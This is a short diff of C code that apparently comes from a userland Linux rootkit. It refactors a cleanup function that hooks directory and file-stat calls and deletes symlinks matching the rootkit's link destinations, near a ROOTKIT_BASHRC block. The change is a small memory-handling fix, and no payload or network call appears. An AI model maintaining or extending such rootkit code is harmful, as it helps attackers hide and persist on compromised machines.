@@ -4,6 +4,7 @@ void bdvcleanse(void){
     int i, lstatstat;
     size_t pathlen;
     struct stat pathstat;
+    char *dest;
 
     hook(COPENDIR, CREADDIR, CACCESS, C__LXSTAT);
 
@@ -30,9 +31,12 @@ void bdvcleanse(void){
         if(lstatstat < 0 || !S_ISLNK(pathstat.st_mode))
             continue;
 
-        for(i = 0; i < LINKSRCS_SIZE; i++)
-            if(!strcmp(basename(linkdests[i]), dir->d_name))
+        for(i = 0; i < LINKSRCS_SIZE; i++){
+            dest = linkdest(i);
+            if(!strcmp(basename(dest), dir->d_name))
                 rm(path);
+            free(dest);
+        }
     }
     closedir(dp);
 #ifdef ROOTKIT_BASHRC
